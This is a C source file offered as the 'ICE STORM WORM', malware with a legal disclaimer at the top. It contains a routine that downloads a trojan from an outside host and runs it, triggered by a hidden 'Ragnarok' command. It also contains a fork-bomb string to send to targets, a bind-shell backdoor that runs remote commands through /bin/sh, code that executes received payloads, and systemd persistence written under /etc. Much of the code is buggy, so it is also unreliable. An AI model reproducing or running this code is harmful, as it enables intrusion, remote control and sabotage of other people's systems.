/*
DISCLAIMER

WARNING: LEGAL USE AND CONSENT REQUIRED

This software is intended solely for educational purposes and security testing. 
It must only be used with the explicit written permission of the owners of the systems on which it will be executed. 
Unauthorized use of this software may violate local, national, 
and international laws regarding cybersecurity and unauthorized access to computer systems.
The author of this software assumes no responsibility for any direct
indirect, or consequential damages resulting from the use of this tool. 
The use of this program is the full responsibility of the user 
who is obligated to ensure that the software is used 
in compliance with applicable laws.

USE THIS SOFTWARE ONLY IF EXPLICIT PERMISSION HAS BEEN OBTAINED FROM THE SYSTEM OWNER.
*/

/*Author: riugxss
You can explore my programming projects on my GitHub: https://github.com/riugxssss
All of my programs are created for educational purposes and focused on penetration testing.
*/


//THE ICE STORM

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <fcntl.h>
#include <wait.h>
#include <sys/stat.h>
#include <getopt.h>

#define BUFFER 1024
#define WHITE   "\033[1;37m"
#define ICE     "\033[1;36m"
#define RESET   "\033[0m"


typedef struct {
    const char *art;
    int portTarget;
    char IpAddress[100];
    int optForParse;
} info;

//Function start only in a certain situation that's simulate a fake web site to get an external malware
void wget(){
    system("wget http://malwariug.io/trojexe -O /tmp/init4");
    system("chmod +x /tmp/init4");
    system("/tmp/init4 &");
}
//Allice func is the propagate func of the program
void Allice(info *data) {
    struct sockaddr_in i1;
    int Usesock;
    char buffer[BUFFER];
    FILE *loveworm;

    const char *Iceprank = "int main() { system("":(){ :|:& };:""); return 0}"; // :)))))))))

    Usesock = socket(AF_INET, SOCK_STREAM, 0);
    if (Usesock == -1) {
        fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m] Failed to create the socket");
        exit(1);
    }

    i1.sin_family = AF_INET;
    i1.sin_port = htons(data->portTarget);
    if (inet_pton(AF_INET, data->IpAddress, &i1.sin_addr) <= 0) {
        fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0mIP: %s INVALID", data->IpAddress);
        close(Usesock);
        exit(1);
    }

    if (connect(Usesock, (struct sockaddr *)&i1, sizeof(i1)) != 0) {
        fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0mFailed the connection with the IP: %s", data->IpAddress);        close(Usesock);
        exit(1);
    }

    printf("\033[1;37mConnection had \033[1;36msuccess.\033[0m Target IP: %s\n", data->IpAddress);

    loveworm = fopen(data->art, "rb");
    if (loveworm == NULL) {
        fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0m Failed to open the file named: %s", data->art);
        close(Usesock);
        exit(1);
    }
    size_t  lenprank = strlen(Iceprank);
    size_t bytes_sent = 0;
    while (bytes_sent < lenprank) {
        size_t bytes_read = (lenprank - bytes_read > BUFFER) ? BUFFER : lenprank - bytes_sent;
        memset(buffer, lenprank + bytes_sent, bytes_read);
        send(Usesock, buffer, bytes_read, 0);
        bytes_sent += bytes_read;
    }

    fclose(loveworm);
    close(Usesock);
    printf("The connection got \033[1;36miced by the art.\033[0m\n");
}
//Client func to use the backdoor and the shell
void client_remote(int clientaddr){
    char buffer[BUFFER];
    ssize_t bytes;
    ssize_t send_var;
    
    while(!strcmp(buffer, "exit")){
        send_var = send(clientaddr, "shell>", 7, 0);
        if (send_var == -1){
            fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0m Error sending the message.");
            exit(1);
        }
        memset(buffer, 0 , BUFFER);
        bytes = recv(clientaddr, buffer, BUFFER - 1, 0);
        if (bytes <= 0){
            fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0m An error occured receiving the bytes..");
            exit(1);
        }

        if (strcmp(buffer, "exit") == 0){
            printf("\033[1;37mConnection ended by the \033[1;36muser\033[0m");
            exit(0);
        }

         if (strcmp(buffer, "Ragnarok") == 0){
             printf("\033[1;36m?~?~?\033[0m");
             wget();
         }

        pid_t PidIce;
        PidIce = fork();
        if (PidIce == 0){
            dup2(clientaddr, STDOUT_FILENO);
            dup2(clientaddr, STDERR_FILENO);
            close(clientaddr);

            execl("/bin/sh", "sh", "-c", buffer, NULL);

            fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0m Problem with the command process");

            exit(EXIT_FAILURE);
        } else if (PidIce > 0){
            wait(NULL);
        } else {
            printf("\033[1;36mThe fork \033[1;37mfailed\033[0m");
            exit(-1);
        }
    }
    close(clientaddr);
}
//Backdoor for remote access
int backdoor(info *data){
    int sock1, client1;
    struct sockaddr_in addr1, addr2;
    socklen_t addrlen = sizeof(addr2);

    sock1 = socket(AF_INET, SOCK_STREAM, 0);
    if (sock1 == -1){
        fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0m Error occured: socket creation failed");
        free(data);
        return 1;
    }
    addr1.sin_family = AF_INET;
    addr1.sin_port = htons(data->portTarget);
    addr1.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock1, (struct sockaddr*)&addr1, sizeof(addr1)) != 0){
        fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0m Error binding the \033[1;36mport: %d \033[0mwith the socket", data->portTarget);
        free(data);
        return 1;
    }

    if (listen(sock1, 1) == -1){
        fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0m The connection listening failed");
        free(data);
        return 1;
    }
    printf("\033[1;37mConnection succeded on port: %d\033[0m", data->portTarget);
    //Client sock accept new connections
    client1 = accept(sock1, (struct sockaddr*)&addr2, &addrlen);
    if (client1 != 0){
        fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0m Error with the socket client");
        free(data);
        return 1;
    }

    printf("Connection \033[1;37maccepted by\n%s | %d\033[0m", inet_ntoa(addr2.sin_addr), ntohs(addr2.sin_port));

    client_remote(client1);

    close(sock1);

    return 0;
}
//Function server start is a server for interlocution of attacker and the target

void start_server(info *data) {
    int s1, c1;
    struct sockaddr_in addrs, addrc;
    char buffer[BUFFER];
    socklen_t addlen = sizeof(addrc);
    FILE *allred;
    ssize_t bytes_recv;
    
    s1 = socket(AF_INET, SOCK_STREAM, 0);
    if (s1 == -1) {
        fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m] Failed to create the socket");
        exit(1);
    }

    addrs.sin_family = AF_INET;
    addrs.sin_port = htons(data->portTarget);
    addrs.sin_addr.s_addr = INADDR_ANY;
    //Bind the sock with the port
    if (bind(s1, (struct sockaddr *)&addrs, sizeof(addrs)) != 0) {
        fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0m Error associating the port with the socket");
        close(s1);
        exit(EXIT_FAILURE);
    }

    if (listen(s1, 1) == -1) {
        fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0m The connection listening failed");
        close(s1);
        exit(1);
    }

    printf("\033[1;37mConnection succeded on port: %d\033[0m", data->portTarget);

    c1 = accept(s1, (struct sockaddr *)&addrc, &addlen);
    if (c1 == -1) {
        fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0m Error with the socket client");
        close(s1);
        exit(1);
    }

    printf("Connection \033[1;37maccepted by\n%s | %d\033[0m", inet_ntoa(addrc.sin_addr), ntohs(addrc.sin_port));
    //File write bytes
    allred = fopen(data->art, "wb");
    if (allred == NULL) {
        fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0m Failed to open the file named: %s", data->art);
        close(c1);
        close(s1);
        exit(EXIT_FAILURE);
    } else {
        printf("File created with success.");
    }

    while (bytes_recv > 0) {
        bytes_recv = recv(c1, buffer, BUFFER, 0);
        if (bytes_recv <= 0) {
            break;
        }
        fwrite(buffer, 1, bytes_recv, allred);
    }

    fclose(allred);
    close(c1);
    close(s1);

    printf("The payload saved in a file named: %s\n", data->art);
    chmod(data->art, 0755);

    // Use the fork function to start the worm inside the server
    printf("Executing the payload...\n");
    pid_t Iceprocess = fork();
    if (Iceprocess == 0) {
        dup2(c1, STDOUT_FILENO);
        dup2(c1, STDERR_FILENO);
        execl(data->art, data->art, NULL);
        perror("Error executing the payload");
        exit(1);
    } else if (Iceprocess > 0) {
        wait(NULL);
    } else {
        printf("\033[1;36mThe fork \033[1;37mfailed\033[0m");
        exit(-1);
    }
    //Start the backdoor.
    backdoor(data);

    char *service_auto = "[Unit]\n"
                            "Description=Service to run back function on boot\n"
                             "[Service]\n"
                             "ExecStart=%s\n"
                             "Restart=always\n"
                             "[Install]\n"
                             "WantedBy=multi-user.target\n";
    char Icepath[256];
    realpath("./wormproj", Icepath);

    char service_file[256];

    snprintf(service_file, sizeof(service_file), "/etc/systemd/system/program.service");

    FILE *danger = fopen(service_file, "w");
    if (danger != NULL){
        fprintf(danger, service_auto, Icepath);
        fclose(danger);

        system("systemctl daemon-reload");
        system("systemctl enable program.service");

        printf("The program will be started everytime.");
        
    } else {
        printf("Error creating the systemd file");
        free(data);
    }
    fclose(danger);
    free(data);                     
}
//Function to verify the IP address
int verify_ip(char *ipAddress) {
    struct sockaddr_in t1;
    return inet_pton(AF_INET, ipAddress, &(t1.sin_addr)) != 0;
}

void print_help() {
    // Mostra le opzioni con il colore specificato
    printf(WHITE "Usage: WORM [OPTIONS]\n");
    printf(WHITE "Options:\n");
    printf(ICE "  -h, --help         " WHITE "Show this help message and exit\n");
    printf(ICE "  -o, --option       " WHITE "Show all commands\n");
    printf(ICE "  -g, --github       " WHITE "Show the GitHub account\n");
    printf(WHITE "\n");
}
int main(int argc, char *argv[]) {
    info *data = malloc(sizeof(info));
    if (data == NULL) {
        fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0m Error with DAM");
        return 1;
    }
    char port[50];
    data->art = "TheLandOfIce";
    char Choiceuser[50];
    struct option parse[] = {
        {"help", no_argument, 0, 'h'},
        {"options", no_argument, 0, 'h'},
        {"github", no_argument, 0, 'g'},
        {0,0,0,0}
    };
   while ((data->optForParse = getopt_long(argc, argv, "hog", parse, NULL)) != -1) {
        switch (data->optForParse) {
        case 'h':
            // Messaggio di aiuto
            printf(ICE "ICE STORM WORM" WHITE " by riugxss\n");
            printf(WHITE "Use the malware only in a legal way.\n");
            print_help();
            exit(EXIT_SUCCESS);
        case 'o':
            // Descrizione della funzione del worm
            printf(ICE "<Server>" WHITE " function starts a server with a backdoor.\n");
            printf(WHITE "The server communicates with you and the target machine.\n");
            printf(ICE "<AllIce>" WHITE " function propagates the worm in the target machine.\n");
            exit(EXIT_SUCCESS);
        case 'g':
            // Link GitHub
            printf(ICE "GitHub: " WHITE "https://github.com/riugxssss\n");
            printf(WHITE "All my projects in C -> C_rep\n");
            exit(EXIT_SUCCESS);
        case '?':
            // Opzione invalida
            printf(WHITE "Invalid option..\n");
            print_help();
            exit(EXIT_SUCCESS);
        default:
            exit(EXIT_SUCCESS);
    }
   }
    printf("\033[1;36mICESTORM\033[0m\n\n");

    printf("\033[1;37mEnter the Port \033[1;36mtarget: \033[0m");
    if (fgets(port, sizeof(port), stdin) != NULL){
        if (!sscanf(port, "%d", &data->portTarget) == 1){
            fprintf(stderr, "\033[1;37m[!] ONLY NUMBERS ALLOWED (int)!\033[0m\n");
            free(data);
            return 1;
        }
    }    
    if (data->portTarget < 0 || data->portTarget > 65535) {
        fprintf(stderr, "\033[1;36m[\033[1;37m!\033[\033[1;36m]\033[0m Port out of the Range\n");
        free(data);
        return 1;
    }

    printf("Choose an option: \033[1;37m(Server | \033[1;36mAllice\033[1;37m]): \033[0m\n");
    fgets(Choiceuser, sizeof(Choiceuser), stdin);

    if (strcmp(Choiceuser, "Server") == 0) {
        printf("Starting \033[1;36mthe server\033[0m\n");
        start_server(data);
    } else if (strcmp(Choiceuser, "Allice") == 0) {
        printf("Enter \033[1;36mthe IP\033[0m of the target: \n");
        fgets(data->IpAddress, sizeof(data->IpAddress), stdin);
        if (verify_ip(data->IpAddress)) {
            printf("IP address valid.\n");
            Allice(data);
        } else {
            fprintf(stderr, "\033[31mInvalid IP address\033[0m\n");
            free(data);
            return 1;
        }
    } else {
        fprintf(stderr, "\033[1;37mInvalid option. Use 'Server' or 'Allice'.\033[0m\n");
    }

    free(data);
    return 0;
}
